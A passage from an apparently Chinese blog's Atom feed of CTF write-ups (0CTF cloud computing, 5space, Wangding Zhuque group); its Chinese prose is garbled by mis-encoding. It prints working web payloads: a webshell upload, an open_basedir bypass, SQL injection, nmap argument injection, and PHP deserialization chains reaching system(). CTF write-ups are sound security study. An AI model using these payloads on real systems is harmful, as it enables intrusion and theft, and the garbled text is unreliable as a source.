ç¬¬äºŒä¸ªå‚æ•°æ˜¯æ•°ç»„æ—¶ï¼Œä¼šæŠŠæ•°ç»„å†…å®¹æ‹¼èµ·æ¥ï¼Œè¿›è¡Œå†™å…¥ã€‚</p><p>æ‰€ä»¥å¯ä»¥æ„é€ ä»¥ä¸‹ payloadï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;pwnable.org:47781&#x2F;?action&#x3D;upload&amp;data[0]&#x3D;%3c&amp;data[1]&#x3D;%3f&amp;data[2]&#x3D;php eval($_POST[1]);</span><br></pre></td></tr></table></figure><p>è¿™æ ·å°±å†™å…¥äº†ä¸€ä¸ªwebshellï¼Œç„¶åå‘ç°æœ‰ open_basediré™åˆ¶ï¼Œä½¿ç”¨ chdirç»•è¿‡ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">error_reporting(-1);mkdir(&#39;sandbox&#x2F;4a3499ebbdf052fa2413cf697e5164184c0d824d&#x2F;gml&#39;);chdir(&#39;sandbox&#x2F;4a3499ebbdf052fa2413cf697e5164184c0d824d&#x2F;gml&#39;);ini_set(&#39;open_basedir&#39;,&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);ini_set(&#39;open_basedir&#39;,&#39;&#x2F;&#39;);var_dump(scandir(&#39;&#x2F;&#39;));</span><br></pre></td></tr></table></figure><p><img src="https://upload-images.jianshu.io/upload_images/9223743-c966545fe043e73d.png" alt="image.png"></p><p> è¯»å–flagï¼Œå‘ç°ä¸€å¤§å †ä¹±ç ï¼Œå¥½åƒæ˜¯ä¸ª imgï¼Œè½¬æ¢æˆ base64è¯»å–ï¼Œæœ¬åœ°æ‹¿ foremost è·‘ä¸€ä¸‹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">2020 0CTF î‚° foremost 0ctfmisc</span><br><span class="line">foremost: &#x2F;usr&#x2F;local&#x2F;etc&#x2F;foremost.conf: No such file or directory</span><br><span class="line">Processing: 0ctfmisc</span><br><span class="line">|*|</span><br></pre></td></tr></table></figure><p>å‡ºäº†ä¸ªå›¾ç‰‡ï¼Œé‡Œé¢æœ‰flagã€‚</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-23081ef4788a5488.png" alt="image.png"></p><h3 id="cloud-computing-v2"><a href="#cloud-computing-v2" class="headerlink" title="cloud computing v2"></a>cloud computing v2</h3><p>å¤ä»‡ç‰ˆï¼Œbanäº†å¾ˆå¤šï¼Œchdirä¹Ÿä¸èƒ½ç”¨äº†ï¼Œç”šè‡³ ini_getéƒ½ä¸èƒ½ç”¨äº†ï¼Œçœ‹æ ·å­ä¸Šä¸ªé¢˜åº”è¯¥ä¹Ÿæ˜¯éé¢„æœŸã€‚</p><p>file_get_contents(â€˜127.0.0.1â€™) ä¸€ä¸‹ï¼Œå‘ç°80ç«¯å£æœ‰ä¸ªåˆ«çš„webæœåŠ¡ã€‚</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-074b4398d03ef2c7.png" alt="image.png"></p><p>è¿™ä¸ªagentï¼Œæƒ³èµ·æ¥v1çš„æ—¶å€™ï¼Œæ ¹ç›®å½•æœ‰ä¸ª agent æ–‡ä»¶ï¼Œæ‹‰ä¸‹æ¥ï¼Œæ˜¯ä¸ªelfã€‚</p><p>goå†™çš„webé€†å‘ï¼Œè£…äº†ä¸ª IDAGolangHelper æ’ä»¶ï¼š</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-cfe182c523ad3008.png" alt="image.png"></p><p>é€†ä¸åŠ¨äº†â€¦ æœ‰æ—¶é—´çš„è¯æ‰¾ä¸ªé€†å‘æ‰‹è¡¥ä¸€æ³¢ã€‚</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;è·Ÿç€ TD æ‰“äº†ä¸€ä¸‹ TCTF &amp;amp; 0CTFï¼ŒåŸºæœ¬0è¾“å‡ºorzï¼Œç»™ TD çš„å¤§ä½¬é€’ teaã€‚&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="https://igml.top/categories/CTF/"/>
    
    <category term="Web" scheme="https://igml.top/categories/CTF/Web/"/>
    
    
    <category term="CTF" scheme="https://igml.top/tags/CTF/"/>
    
    <category term="wp" scheme="https://igml.top/tags/wp/"/>
    
  </entry>
  
  <entry>
    <title>2020 ç¬¬äº”ç©ºé—´æ™ºèƒ½å®‰å…¨å¤§èµ›åˆèµ›wp</title>
    <link href="https://igml.top/2020/06/25/2020-5space/"/>
    <id>https://igml.top/2020/06/25/2020-5space/</id>
    <published>2020-06-25T10:27:34.000Z</published>
    <updated>2020-06-25T11:02:00.609Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="hate-php"><a href="#hate-php" class="headerlink" title="hate-php"></a>hate-php</h3><p>ä¸€èˆ¬çš„æ— å­—æ¯shellï¼Œç›´æ¥ç”¨ï½å–åå°±è¡Œäº†ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;121.36.74.163&#x2F;?code&#x3D;(~%8C%86%8C%8B%9A%92)(~(%9C%9E%8B%DF%99%93%9E%98%D1%8F%97%8F))</span><br></pre></td></tr></table></figure><a id="more"></a><h3 id="do-you-know"><a href="#do-you-know" class="headerlink" title="do you know"></a>do you know</h3><p>å˜é‡èµ‹å€¼ä¸€ç›´ç»•ä¸è¿‡å»ï¼Œ$paramå’Œ$typeè¿™äº›æ— æ³•èµ‹å€¼ï¼Œæ— æ³•xxeã€‚æµ‹è¯•äº†ä¸€ä¸‹ï¼Œ<code>$_SERVER[&#39;QUERY_STRING&#39;];</code>ä¸ä¼šè¿›è¡Œurlè§£ç ï¼Œè€Œåé¢èµ‹å€¼æ˜¯$_GETèµ‹çš„å€¼ï¼Œä¿å­˜çš„æ˜¯è§£ç åçš„å€¼ï¼Œä¹Ÿå°±æ˜¯è¯´wafæ£€æµ‹çš„æ˜¯urlè§£ç å‰çš„valueï¼Œç›´æ¥å°† file:///var/www/html/flag.php è¿›è¡Œurlç¼–ç ï¼Œå¯ä»¥æ‹¿åˆ°flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;121.36.64.91&#x2F;?a&#x3D;1&amp;b&#x3D;1&amp;url&#x3D;%66%69%6c%65%3a%2f%2f%2f%76%61%72%2f%77%77%77%2f%68%74%6d%6c%2f%66%6c%61%67%2e%70%68%70</span><br></pre></td></tr></table></figure><h3 id="ç¾å›¢å¤–å–"><a href="#ç¾å›¢å¤–å–" class="headerlink" title="ç¾å›¢å¤–å–"></a>ç¾å›¢å¤–å–</h3><p>www.zipæºç æ³„æ¼ï¼Œå®¡è®¡æºç ã€‚ç™»é™†å¤„æ²¡æœ‰ä»€ä¹ˆè¿‡æ»¤ã€‚</p><p><code>password=123456&amp;username=admin&#39; and 0 union select &#39;e10adc3949ba59abbe56e057f20f883e&#39; limit 1 offset 0#</code>å¯ä»¥ç™»é™†ï¼Œä½†æ˜¯sessioné‡Œé¢çš„userä¸æ˜¯adminï¼Œå¾ˆå¤šä¸œè¥¿æ²¡æ³•æã€‚</p><p>å°è¯•æ³¨adminçš„å¯†ç ï¼Œç”¨æ—¶é—´ç›²æ³¨ï¼Œä¸èƒ½ç”¨é€—å·ï¼Œä½¿ç”¨case whenä»¥åŠsubstr from ç»•è¿‡ï¼Œç»“æœé¢˜ç›®é™åˆ¶è¯·æ±‚é€Ÿç‡ï¼Œsleep(10)éƒ½ä¸è¡Œï¼Œè¿˜ban ipâ€¦. åº”è¯¥ä¸æ˜¯ç›²æ³¨ã€‚æ‰¾æ‰¾åº”è¯¥æœ‰å…¶ä»–æ³¨å…¥ç‚¹ï¼Œå®¡è®¡åˆ°daochu.phpï¼Œæ²¡æœ‰ä»»ä½•è¿‡æ»¤ï¼Œè¿˜æœ‰å›æ˜¾ã€‚</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-2a085ffe2c0defff.png" alt="image.png"></p><p>æœ‰ä¸ªhintï¼Œè¯»ä¸€ä¸‹åˆ—åï¼Œæ˜¯hintsã€‚è¯»ä¸€ä¸‹æ•°æ®ï¼š</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-c90035078ec69185.png" alt="image.png"></p><p>çœ‹è¿™ä¸ªç›®å½•ï¼Œå’Œä¸»é¡µä¸€æ¨¡ä¸€æ ·çš„ç•Œé¢â€¦è¿™åº”è¯¥æ˜¯çœŸç›®å½•ã€‚ä¸¤ä¸ªç›®å½•è‚¯å®šæœ‰ä¸åŒã€‚</p><p>æ–°ç›®å½•å¯ä»¥è®¿é—®libæ–‡ä»¶å¤¹ï¼Œè€ŒåŸæ¥çš„ä¸å¯ä»¥ï¼Œlibé‡Œè‚¯å®šæœ‰ä¸œè¥¿ã€‚åœ¨libæ–‡ä»¶å¤¹ä¸‹å‘ç°webuploaderï¼Œç‰ˆæœ¬æ˜¯0.1.5ï¼Œæœä¸€æ³¢æœ‰æ´ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;9finger.cn&#x2F;2020&#x2F;03&#x2F;06&#x2F;CNVD-2018-26054%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0&#x2F;#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90</span><br></pre></td></tr></table></figure><p>é“¾æ¥expæ‰“ä¸Šå»ï¼Œphpè¢«è¿‡æ»¤ï¼Œæ¢ä¸ªå¤§å°å†™ï¼š</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-322391598b0c65d5.png" alt="image.png"></p><p>æç¤ºè®©æˆ‘è®¿é—®<a href="http://119.3.183.154/956c110ef9decdd920249f5fed9e4427/lib/webuploader/0.1.5/server/e98a4571cf72b798077d12d6c94629.php">http://119.3.183.154/956c110ef9decdd920249f5fed9e4427/lib/webuploader/0.1.5/server/e98a4571cf72b798077d12d6c94629.php</a>ï¼Œå›æ˜¾getfileã€‚è¯•ä¸€ä¸‹file=phpinfo();ä¸è¡Œï¼Œfile=/flagï¼Œè¯»åˆ°flagã€‚</p><p><a href="http://119.3.183.154/956c110ef9decdd920249f5fed9e4427/lib/webuploader/0.1.5/server/e98a4571cf72b798077d12d6c94629.php?file=/flag">http://119.3.183.154/956c110ef9decdd920249f5fed9e4427/lib/webuploader/0.1.5/server/e98a4571cf72b798077d12d6c94629.php?file=/flag</a></p><h3 id="Laravel"><a href="#Laravel" class="headerlink" title="Laravel"></a>Laravel</h3><p>indexè·¯ç”±å°±ä¸€ä¸ªååºåˆ—åŒ–ï¼Œæ˜¾ç„¶å°±æ˜¯æ‰¾é“¾ã€‚æœåˆ°è¿™ä¸€ç¯‡ï¼š<a href="https://www.anquanke.com/post/id/184541#h3-2ã€‚">https://www.anquanke.com/post/id/184541#h3-2ã€‚</a></p><p>è¿™é‡Œçš„Generatorç±»å¯ä»¥ç”¨ï¼Œä½†æ˜¯å¦ä¸€ä¸ªIlluminateBroadcastingæ²¡æœ‰ã€‚æˆ‘ä»¬éœ€è¦æ‰¾åˆ°ä¸€ä¸ªç±»ï¼Œå…¶ä¸­ä¸€ä¸ªå±æ€§å¯æ§ï¼Œèµ‹å€¼æˆæ„é€ çš„Generatorå¯¹è±¡ï¼ŒåŒæ—¶è¿™ä¸ªç±»ææ„å‡½æ•°éœ€è¦è°ƒç”¨è¿™ä¸ªå±æ€§çš„ä¸€ä¸ªä¸å­˜åœ¨çš„æ–¹æ³•ã€‚è¿™æ ·å°±å¯ä»¥è°ƒç”¨Generatorçš„__callä»è€ŒRCEã€‚ã€‚Vendoræ–‡ä»¶å¤¹é‡Œæœç´¢__destructï¼Œæ‰¾åˆ°äº†ä¸€ä¸ªï¼š</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-4554eadef6216c8c.png" alt="image.png"></p><p>parentå¯ä»¥æ§åˆ¶ï¼Œé‚£ä¹ˆä»¿ç…§é“¾æ¥ä¸­çš„ä¾‹å­ï¼Œæˆ‘ä»¬å°±å¯ä»¥å®ç°RCEã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Routing</span>\<span class="title">Loader</span>\<span class="title">Configurator</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">ImportConfigurator</span>&#123;</span><br><span class="line">        <span class="title">private</span> $<span class="title">parent</span>;</span><br><span class="line">        <span class="keyword">private</span> $route;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$parent,$route</span>)</span>&#123;</span><br><span class="line">              <span class="keyword">$this</span>-&gt;parent=$parent;</span><br><span class="line">              <span class="keyword">$this</span>-&gt;route=$route;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Faker</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Generator</span>&#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">formatters</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$formatters</span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;formatters=$formatters; </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">    $<span class="title">generator</span> = <span class="title">new</span> <span class="title">Faker</span>\<span class="title">Generator</span>(<span class="title">array</span>(&quot;<span class="title">addCollection</span>&quot;=&gt;&quot;<span class="title">system</span>&quot;));</span><br><span class="line">    $exp = <span class="keyword">new</span> \Symfony\Component\Routing\Loader\Configurator\ImportConfigurator($generator,<span class="string">&quot;cat /flag&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> urlencode(serialize($exp));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O%3A64%3A%22Symfony%5CComponent%5CRouting%5CLoader%5CConfigurator%5CImportConfigurator%22%3A2%3A%7Bs%3A72%3A%22%00Symfony%5CComponent%5CRouting%5CLoader%5CConfigurator%5CImportConfigurator%00parent%22%3BO%3A15%3A%22Faker%5CGenerator%22%3A1%3A%7Bs%3A13%3A%22%00%2A%00formatters%22%3Ba%3A1%3A%7Bs%3A13%3A%22addCollection%22%3Bs%3A6%3A%22system%22%3B%7D%7Ds%3A71%3A%22%00Symfony%5CComponent%5CRouting%5CLoader%5CConfigurator%5CImportConfigurator%00route%22%3Bs%3A9%3A%22cat+%2Fflag%22%3B%7D</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;Web&quot;&gt;&lt;a href=&quot;#Web&quot; class=&quot;headerlink&quot; title=&quot;Web&quot;&gt;&lt;/a&gt;Web&lt;/h2&gt;&lt;h3 id=&quot;hate-php&quot;&gt;&lt;a href=&quot;#hate-php&quot; class=&quot;headerlink&quot; title=&quot;hate-php&quot;&gt;&lt;/a&gt;hate-php&lt;/h3&gt;&lt;p&gt;ä¸€èˆ¬çš„æ— å­—æ¯shellï¼Œç›´æ¥ç”¨ï½å–åå°±è¡Œäº†ã€‚&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;http:&amp;#x2F;&amp;#x2F;121.36.74.163&amp;#x2F;?code&amp;#x3D;(~%8C%86%8C%8B%9A%92)(~(%9C%9E%8B%DF%99%93%9E%98%D1%8F%97%8F))&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</summary>
    
    
    
    <category term="CTF" scheme="https://igml.top/categories/CTF/"/>
    
    <category term="Web" scheme="https://igml.top/categories/CTF/Web/"/>
    
    
    <category term="CTF" scheme="https://igml.top/tags/CTF/"/>
    
    <category term="Web" scheme="https://igml.top/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>2020ç½‘é¼æ¯-æœ±é›€ç»„wp</title>
    <link href="https://igml.top/2020/05/18/2020-%E7%BD%91%E9%BC%8E%E6%9D%AF-%E6%9C%B1%E9%9B%80/"/>
    <id>https://igml.top/2020/05/18/2020-%E7%BD%91%E9%BC%8E%E6%9D%AF-%E6%9C%B1%E9%9B%80/</id>
    <published>2020-05-18T02:58:26.000Z</published>
    <updated>2020-05-18T16:29:40.503Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h3><p>å¯ä»¥æ‰«æipï¼Œå°è¯•å‘½ä»¤æ³¨å…¥æœªæœï¼Œåº”è¯¥æ˜¯è°ƒç”¨äº†nmapè¿›è¡Œæ‰«æã€‚</p><a id="more"></a><p>nmapå¯ä»¥è¯»å–æ–‡ä»¶ä¸­çš„å†…å®¹è¿›è¡Œæ‰«æï¼Œflagè‚¯å®šæ˜¯éæ³•ipï¼Œnmapè¾“å‡ºä¼šæŠŠå†…å®¹æŠ¥é”™å‡ºæ¥ï¼Œåˆ©ç”¨è¿™ä¸ªç‰¹ç‚¹ï¼ŒæŠŠç»“æœè¾“å‡ºåˆ°webç›®å½•ä¸‹çš„æ–‡ä»¶ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39; -iL &#x2F;flag -oN &#x2F;var&#x2F;www&#x2F;html&#x2F;abc.txt &#39;</span><br></pre></td></tr></table></figure><p> è®¿é—®abc.txtã€‚</p><h3 id="phpweb"><a href="#phpweb" class="headerlink" title="phpweb"></a>phpweb</h3><p>ä¼ å…¥çš„pä¸funcæ˜¯ $func($p) å½¢å¼æ‰§è¡Œï¼Œå¯ä»¥è¯»åˆ°æºç ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">func&#x3D;readfile&amp;p&#x3D;index.php</span><br></pre></td></tr></table></figure><p>æºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $disable_fun = <span class="keyword">array</span>(<span class="string">&quot;exec&quot;</span>,<span class="string">&quot;shell_exec&quot;</span>,<span class="string">&quot;system&quot;</span>,<span class="string">&quot;passthru&quot;</span>,<span class="string">&quot;proc_open&quot;</span>,<span class="string">&quot;show_source&quot;</span>,<span class="string">&quot;phpinfo&quot;</span>,<span class="string">&quot;popen&quot;</span>,<span class="string">&quot;dl&quot;</span>,<span class="string">&quot;eval&quot;</span>,<span class="string">&quot;proc_terminate&quot;</span>,<span class="string">&quot;touch&quot;</span>,<span class="string">&quot;escapeshellcmd&quot;</span>,<span class="string">&quot;escapeshellarg&quot;</span>,<span class="string">&quot;assert&quot;</span>,<span class="string">&quot;substr_replace&quot;</span>,<span class="string">&quot;call_user_func_array&quot;</span>,<span class="string">&quot;call_user_func&quot;</span>,<span class="string">&quot;array_filter&quot;</span>, <span class="string">&quot;array_walk&quot;</span>,  <span class="string">&quot;array_map&quot;</span>,<span class="string">&quot;registregister_shutdown_function&quot;</span>,<span class="string">&quot;register_tick_function&quot;</span>,<span class="string">&quot;filter_var&quot;</span>, <span class="string">&quot;filter_var_array&quot;</span>, <span class="string">&quot;uasort&quot;</span>, <span class="string">&quot;uksort&quot;</span>, <span class="string">&quot;array_reduce&quot;</span>,<span class="string">&quot;array_walk&quot;</span>, <span class="string">&quot;array_walk_recursive&quot;</span>,<span class="string">&quot;pcntl_exec&quot;</span>,<span class="string">&quot;fopen&quot;</span>,<span class="string">&quot;fwrite&quot;</span>,<span class="string">&quot;file_put_contents&quot;</span>);</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">gettime</span>(<span class="params">$func, $p</span>) </span>&#123;</span><br><span class="line">        $result = call_user_func($func, $p);</span><br><span class="line">        $a= gettype($result);</span><br><span class="line">        <span class="keyword">if</span> ($a == <span class="string">&quot;string&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> $result;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;<span class="keyword">return</span> <span class="string">&quot;&quot;</span>;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> $p = <span class="string">&quot;Y-m-d h:i:s a&quot;</span>;</span><br><span class="line">        <span class="keyword">var</span> $func = <span class="string">&quot;date&quot;</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;func != <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">                <span class="keyword">echo</span> gettime(<span class="keyword">$this</span>-&gt;func, <span class="keyword">$this</span>-&gt;p);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    $func = $_REQUEST[<span class="string">&quot;func&quot;</span>];</span><br><span class="line">    $p = $_REQUEST[<span class="string">&quot;p&quot;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ($func != <span class="literal">null</span>) &#123;</span><br><span class="line">        $func = strtolower($func);</span><br><span class="line">        <span class="keyword">if</span> (!in_array($func,$disable_fun)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> gettime($func, $p);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Hacker...&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>banäº†æ‰§è¡Œä»£ç ä¹‹ç±»çš„å‡½æ•°ï¼Œgettime æœ‰ä¸ª call_user_funcï¼Œè¿˜æœ‰ä¸ªç±»ï¼Œæƒ³åˆ°å¯ä»¥ååºåˆ—åŒ–ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $p = <span class="string">&quot;ls&quot;</span>;</span><br><span class="line">    <span class="keyword">var</span> $func = <span class="string">&quot;system&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="keyword">new</span> Test());</span><br></pre></td></tr></table></figure><p><img src="https://upload-images.jianshu.io/upload_images/9223743-21d75094c0b434e2.png" alt="image.png"></p><p>è¯»å–flagã€‚</p><h3 id="think-java"><a href="#think-java" class="headerlink" title="think java"></a>think java</h3><p>è¿™ä¸ªé¢˜æ¯”èµ›åšäº†ä¸€åŠï¼Œåœ¨buuojå¤ç°çš„ã€‚</p><p>æ‰«äº†ä¸€æ³¢ç›®å½•ï¼Œå‘ç°äº†swagger-ui.htmlï¼Œçœ‹åˆ°äº†ä¸‰ä¸ªapiï¼š</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-a93e2a84b569cc08.png" alt="image.png"></p><p>sqlDictä¼ å…¥ä¸€ä¸ªdbnameã€‚</p><p>ç»™äº†éƒ¨åˆ†classï¼Œæ‹–åˆ°jdguiåˆ†æï¼Œjdbcè¿æ¥æ•°æ®åº“ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SqlDict</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Connection <span class="title">getConnection</span><span class="params">(String dbName, String user, String pass)</span> </span>&#123;</span><br><span class="line">    Connection conn = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      Class.forName(<span class="string">&quot;com.mysql.jdbc.Driver&quot;</span>);</span><br><span class="line">      <span class="keyword">if</span> (dbName != <span class="keyword">null</span> &amp;&amp; !dbName.equals(<span class="string">&quot;&quot;</span>)) &#123;</span><br><span class="line">        dbName = <span class="string">&quot;jdbc:mysql://mysqldbserver:3306/&quot;</span> + dbName;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        dbName = <span class="string">&quot;jdbc:mysql://mysqldbserver:3306/myapp&quot;</span>;</span><br><span class="line">      &#125; </span><br><span class="line">      <span class="keyword">if</span> (user == <span class="keyword">null</span> || dbName.equals(<span class="string">&quot;&quot;</span>))</span><br><span class="line">        user = <span class="string">&quot;root&quot;</span>; </span><br><span class="line">      <span class="keyword">if</span> (pass == <span class="keyword">null</span> || dbName.equals(<span class="string">&quot;&quot;</span>))</span><br><span class="line">        pass = <span class="string">&quot;abc@12345&quot;</span>; </span><br><span class="line">      conn = DriverManager.getConnection(dbName, user, pass);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (ClassNotFoundException var5) &#123;</span><br><span class="line">      var5.printStackTrace();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (SQLException var6) &#123;</span><br><span class="line">      var6.printStackTrace();</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">return</span> conn;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>å…¶ä¸­ï¼Œtest æ¥å£å¯ä»¥ä¼ å…¥ dbNameï¼Œæ‹¼æ¥åˆ°è¿æ¥ï¼Œæƒ³åˆ°äº†jdbcååºåˆ—åŒ–ï¼Œå¾€ä¸‹çœ‹ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> List&lt;Table&gt; <span class="title">getTableData</span><span class="params">(String dbName, String user, String pass)</span> </span>&#123;</span><br><span class="line">  List&lt;Table&gt; Tables = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">  Connection conn = getConnection(dbName, user, pass);</span><br><span class="line">  String TableName = <span class="string">&quot;&quot;</span>;</span><br><span class="line">  <span 